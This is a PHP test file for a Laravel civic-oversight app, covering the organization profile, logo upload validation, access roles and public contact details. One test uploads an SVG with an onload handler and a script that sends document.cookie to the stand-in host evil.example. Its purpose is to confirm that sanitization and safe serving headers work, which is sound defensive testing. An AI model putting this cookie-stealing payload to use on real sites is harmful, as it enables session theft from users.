<?php

use App\Application\Organization\ConfigureTerritory;
use App\Application\Organization\RegisterOrganization;
use App\Domain\Audit\AuditLog;
use App\Domain\Organization\Roles;
use App\Infrastructure\Tenancy\Tenant;
use Database\Seeders\DivipolaSeeder;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Storage;
use Illuminate\Testing\TestResponse;
use Inertia\Testing\AssertableInertia as Assert;

/*
 * Iteración 21 — Nombre de fantasía y logo de la veeduría (specs/PLAN.md).
 * Traduce features/US-007.feature (15 casos) contra los endpoints reales:
 * GET y POST /organization/profile, y el logo público en /organization/logo.
 *
 * Las imágenes de prueba se arman a mano (el contenedor no trae GD): un PNG
 * con su cabecera IHDR real — de donde getimagesize() lee las dimensiones —
 * y relleno hasta el peso pedido.
 *
 * Sin RefreshDatabase — registrar la organización ejecuta CREATE DATABASE.
 */

const LOGO_FORMAT = 'El formato del archivo no es válido. Solo se permiten imágenes PNG, JPG o SVG.';
const LOGO_TOO_LARGE = 'El tamaño de la imagen supera el límite permitido de 2 MB.';
const LOGO_TOO_SMALL = 'La imagen es demasiado pequeña. Las dimensiones mínimas requeridas son de al menos 128x128 píxeles.';
const DISPLAY_NAME_LENGTH = 'El nombre de fantasía debe tener entre 3 y 100 caracteres.';

beforeEach(function () {
    $this->artisan('migrate');
    (new DivipolaSeeder)->run();
    Storage::fake('evidencias');

    $this->tenant = (new RegisterOrganization)->handle('900123456-8', 'Veeduría Ciudadana Santa Marta', 'veeduria-smr');
    (new ConfigureTerritory)->handle($this->tenant, ['47']);
    $this->administrator = reportingMember($this->tenant, 'ana.perez@veeduria-smr.org', Roles::Administrator);
    $this->veedor = reportingMember($this->tenant, 'carlos@correo.co');
});

afterEach(function () {
    if (tenant()) {
        tenancy()->end();
    }

    Tenant::query()->get()->each->delete();
    DB::table('audit_logs')->delete();
});

/** A PNG whose IHDR says $width x $height, padded to $bytes. */
function pngLogo(int $width, int $height, int $bytes = 300 * 1024, string $name = 'logo.png'): UploadedFile
{
    $chunk = fn (string $type, string $data) => pack('N', strlen($data)).$type.$data.pack('N', crc32($type.$data));
    $png = "\x89PNG\r\n\x1a\n"
        .$chunk('IHDR', pack('NNCCCCC', $width, $height, 8, 6, 0, 0, 0))
        .$chunk('IDAT', '')
        .$chunk('IEND', '');

    return UploadedFile::fake()->createWithContent($name, $png.str_repeat("\0", max(0, $bytes - strlen($png))));
}

function gifLogo(): UploadedFile
{
    $gif = 'GIF89a'.pack('vv', 512, 512)."\x00\x00\x00".str_repeat("\0", 300 * 1024);

    return UploadedFile::fake()->createWithContent('logo.gif', $gif);
}

/** POST /organization/profile as $member (multipart). */
function saveProfile(array $data, $member = null): TestResponse
{
    return test()->actingAs($member ?? test()->administrator, 'tenant')
        ->post('http://veeduria-smr.govtrace.localhost/organization/profile', $data, ['Accept' => 'application/json']);
}

it('Actualización exitosa del nombre y el logo: the veedores see the new name and logo right away', function () {
    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => pngLogo(512, 512)])
        ->assertOk()
        ->assertJson(['message' => 'Los cambios fueron guardados. Sus veedores ya ven el nuevo nombre y logo.']);

    $profile = $this->actingAs($this->administrator, 'tenant')->getJson('http://veeduria-smr.govtrace.localhost/organization/profile')->json('data');
    expect($profile['display_name'])->toBe('Ojo Ciudadano SMR');

    // Lo que ve un veedor en su próxima pantalla.
    $logoUrl = null;
    $this->withoutVite()->actingAs($this->veedor, 'tenant')->get('http://veeduria-smr.govtrace.localhost/reports/new')
        ->assertInertia(function (Assert $page) use (&$logoUrl) {
            $page->where('organization', 'Ojo Ciudadano SMR')->where('organizationLogo', fn ($url) => is_string($url));
            $logoUrl = $page->toArray()['props']['organizationLogo'];
        });

    $logo = $this->get('http://veeduria-smr.govtrace.localhost'.$logoUrl);
    $logo->assertOk()->assertHeader('Content-Type', 'image/png');
    expect(str_starts_with($logo->streamedContent(), "\x89PNG"))->toBeTrue();

    $entry = AuditLog::query()->where('action', 'organization.profile_updated')->sole();
    expect($entry->actor_id)->toBe((string) $this->administrator->id)
        ->and($entry->after['display_name'])->toBe('Ojo Ciudadano SMR');
});

it('Logo con formato no permitido: a GIF is rejected', function () {
    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => gifLogo()])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['logo' => LOGO_FORMAT]);
});

it('does not trust the extension: a GIF named logo.png is rejected too', function () {
    $disguised = UploadedFile::fake()->createWithContent('logo.png', gifLogo()->getContent());

    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => $disguised])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['logo' => LOGO_FORMAT]);
});

it('Logo que supera los 2 MB', function () {
    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => pngLogo(512, 512, (int) (2.5 * 1024 * 1024))])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['logo' => LOGO_TOO_LARGE]);
});

it('Logo por debajo de 128x128 píxeles', function (int $width, int $height, bool $accepted) {
    $response = saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => pngLogo($width, $height)]);

    $accepted ? $response->assertOk() : $response->assertUnprocessable()->assertJsonValidationErrors(['logo' => LOGO_TOO_SMALL]);
})->with([
    '127x128' => [127, 128, false],
    '128x127' => [128, 127, false],
    '128x128' => [128, 128, true],
]);

it('Mensaje al rechazar un logo pequeño: 100x100', function () {
    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => pngLogo(100, 100)])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['logo' => LOGO_TOO_SMALL]);
});

it('Un logo SVG con contenido ejecutable se guarda limpio, and is served so a browser cannot run anything in it', function () {
    $svg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" onload="alert(document.cookie)">'
        .'<script>fetch("https://evil.example/?c="+document.cookie)</script>'
        .'<circle cx="256" cy="256" r="200" fill="#0f172a"/></svg>';

    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => UploadedFile::fake()->createWithContent('logo.svg', $svg)])->assertOk();

    $logo = $this->get('http://veeduria-smr.govtrace.localhost/organization/logo');
    $saved = $logo->streamedContent();

    expect($saved)->not->toContain('<script')
        ->and($saved)->not->toContain('onload')
        ->and($saved)->not->toContain('document.cookie')
        ->and($saved)->toContain('<circle');
    $logo->assertHeader('Content-Type', 'image/svg+xml')
        ->assertHeader('X-Content-Type-Options', 'nosniff');
    expect($logo->headers->get('Content-Security-Policy'))->toContain("default-src 'none'")->toContain('sandbox');
});

it('El nombre de fantasía debe tener entre 3 y 100 caracteres', function (int $length, bool $accepted) {
    $response = saveProfile(['display_name' => str_repeat('a', $length)]);

    $accepted ? $response->assertOk() : $response->assertUnprocessable()->assertJsonValidationErrors(['display_name' => DISPLAY_NAME_LENGTH]);
})->with([
    '2' => [2, false],
    '3' => [3, true],
    '100' => [100, true],
    '101' => [101, false],
]);

it('Mensaje cuando el nombre de fantasía está fuera de rango: "OC"', function () {
    saveProfile(['display_name' => 'OC'])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['display_name' => DISPLAY_NAME_LENGTH]);
});

it('El NIT no es editable desde la configuración de la veeduría: it is shown, and sending it changes nothing', function () {
    $profile = $this->actingAs($this->administrator, 'tenant')->getJson('http://veeduria-smr.govtrace.localhost/organization/profile')->json('data');

    expect($profile)->toMatchArray(['nit' => '900123456-8', 'legal_name' => 'Veeduría Ciudadana Santa Marta']);

    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'nit' => '901234567-7', 'name' => 'Otra'])->assertOk();

    expect($this->tenant->fresh()->nit)->toBe('900123456-8')
        ->and($this->tenant->fresh()->name)->toBe('Veeduría Ciudadana Santa Marta');
});

it('Un veedor no accede a la configuración de la organización', function () {
    $this->actingAs($this->veedor, 'tenant')->getJson('http://veeduria-smr.govtrace.localhost/organization/profile')->assertForbidden();
    saveProfile(['display_name' => 'Ojo Ciudadano SMR'], $this->veedor)->assertForbidden();
    $this->withoutVite()->actingAs($this->veedor, 'tenant')->get('http://veeduria-smr.govtrace.localhost/admin/organization')->assertForbidden();

    expect($this->tenant->fresh()->display_name)->toBeNull();
});

// Reglas derivadas ------------------------------------------------------

it('serves the settings screen to the Administrador', function () {
    $this->withoutVite()->actingAs($this->administrator, 'tenant')
        ->get('http://veeduria-smr.govtrace.localhost/admin/organization')
        ->assertOk()
        ->assertInertia(fn (Assert $page) => $page->component('Admin/Organization'));
});

it('keeps the current logo when only the name changes, and shows the legal name until a display name is set', function () {
    $this->withoutVite()->actingAs($this->veedor, 'tenant')->get('http://veeduria-smr.govtrace.localhost/reports/new')
        ->assertInertia(fn (Assert $page) => $page->where('organization', 'Veeduría Ciudadana Santa Marta')->where('organizationLogo', null));

    saveProfile(['display_name' => 'Ojo Ciudadano SMR', 'logo' => pngLogo(512, 512)])->assertOk();
    saveProfile(['display_name' => 'Ojo Ciudadano'])->assertOk();

    $this->get('http://veeduria-smr.govtrace.localhost/organization/logo')->assertOk()->assertHeader('Content-Type', 'image/png');
});

it('answers 404 when the organization has no logo', function () {
    $this->get('http://veeduria-smr.govtrace.localhost/organization/logo')->assertNotFound();
});

// It. 43h (V13): el contacto público de la veeduría.

it('La veeduría publica su correo y su teléfono de contacto: its public site shows them, and the log keeps the change', function () {
    saveProfile(['display_name' => 'Veeduría Ciudadana Santa Marta', 'contact_email' => 'contacto@veeduria-smr.org', 'contact_phone' => '+57 300 123 4567'])->assertOk();

    publicGet('/')->assertInertia(fn (Assert $page) => $page->where('organizationContact', ['email' => 'contacto@veeduria-smr.org', 'phone' => '+57 300 123 4567']));
    $entry = AuditLog::query()->where('action', 'organization.profile_updated')->sole();
    expect($entry->before['contact'])->toBe(['email' => null, 'phone' => null])
        ->and($entry->after['contact'])->toBe(['email' => 'contacto@veeduria-smr.org', 'phone' => '+57 300 123 4567']);
});

it('Un correo de contacto que no es válido se rechaza', function () {
    saveProfile(['display_name' => 'Veeduría Ciudadana Santa Marta', 'contact_email' => 'contacto@'])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['contact_email' => 'Escriba un correo de contacto válido, como contacto@veeduria.org.']);
});

it('Un teléfono de contacto que no es válido se rechaza', function (string $phone) {
    saveProfile(['display_name' => 'Veeduría Ciudadana Santa Marta', 'contact_email' => 'contacto@veeduria-smr.org', 'contact_phone' => $phone])
        ->assertUnprocessable()
        ->assertJsonValidationErrors(['contact_phone' => 'Escriba un teléfono de 7 a 15 dígitos. Puede empezar con + y llevar espacios o guiones.']);
})->with(['300-ABC', '12345', '+57 300 123 4567 8901 23']);

it('shows no contact on the public site while the veeduría has none, and the phone is optional', function () {
    publicGet('/')->assertInertia(fn (Assert $page) => $page->where('organizationContact', null));

    saveProfile(['display_name' => 'Veeduría Ciudadana Santa Marta', 'contact_email' => 'contacto@veeduria-smr.org'])->assertOk();
    publicGet('/')->assertInertia(fn (Assert $page) => $page->where('organizationContact', ['email' => 'contacto@veeduria-smr.org', 'phone' => null]));
});

it('gives the Administrador the contact it has, to edit it', function () {
    saveProfile(['display_name' => 'Veeduría Ciudadana Santa Marta', 'contact_email' => 'contacto@veeduria-smr.org', 'contact_phone' => '605 431 0000'])->assertOk();

    expect($this->actingAs($this->administrator, 'tenant')->getJson('http://veeduria-smr.govtrace.localhost/organization/profile')->json('data'))
        ->toMatchArray(['contact_email' => 'contacto@veeduria-smr.org', 'contact_phone' => '605 431 0000']);
});
